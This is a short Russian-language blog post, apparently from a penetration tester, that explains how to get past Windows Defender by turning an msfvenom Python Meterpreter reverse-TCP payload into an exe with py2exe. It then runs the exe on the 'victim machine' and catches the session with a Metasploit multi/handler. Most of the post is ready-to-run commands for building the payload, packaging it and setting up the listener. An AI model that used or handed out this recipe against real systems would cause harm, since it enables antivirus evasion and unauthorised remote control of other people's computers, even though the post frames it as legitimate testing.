---
layout: post
categories: articles
tags:
  - ru
  - edr
  - windows
published: true
ru: true
---

# Оглавление
{:.no_toc}

* toc
{:toc}

# Введение

Итак ситуация, есть возможность загрузить на тестируемую в рамках пентеста или другой легимитивной деятельности Windows машину файл и даже возможно исполнить его. Если мы говорим об последней, десятой версиии ОС то мы столкнёмся с местнымм его защитником Windows Defender, так же велика вероятность наткнуться на антивирус. В такой ситуации очень удобный и расширяемый meterpreter не сможет работать, какая есть альтернатива? 

## Python
{:id="python"}

Вот и ответ, использование Python в связке с metasploit и msfvenom позволяет нам получить достойную альтернативу классическому meterpreter с большинством его удобных функций. Правда некоторыми придется пожертвовать, не будет возможности использовать такие команды как getsystem и нельзя будет мигрировать в процесс.


# Начинаем

Общая схема такова: мы генерируем python код с помощью msfvenom, "скармливаем" его py2exe, полученый бинарник запускаем на машине жертвы и ловим сессию.
<br><br>
Для начала установим py2exe под 3.4 версию так как всё что выше не поддерживается.
~~~
pip install py2exe
~~~
Или, если вы как и я любите обновляться
~~~
python -3.4 –m pip install py2exe
~~~

<br><br>

Далее создаём .py код:
~~~
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > payload.py
~~~

К коду необходимо добавить import getpass который msfvenom по умолчанию почему-то не делает.

<br><br>


Делаем exe:
<br>
~~~
python34 -m py2exe.build_exe payload.py --bundle-files 0
~~~


И запускаем его на машине жертвы предварительно запустив handler:<br>
~~~
msfconsole
use exploit/multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set lhost eth0
set lport <PORT>
run
~~~

И получаем коммандную оболочку:

![Python_shell]({{ site.baseurl }}/assets/img/posts_rus/python_shell.jpg){:class="img"}

# Заключение
{:id="end"}

Простой и эффективный способ борьбы с Windows Defender если не хочется терять удобный и привычный функционал meterpreter в угоду более нативным решениям, как например ssh или telnet. 
<br><br>
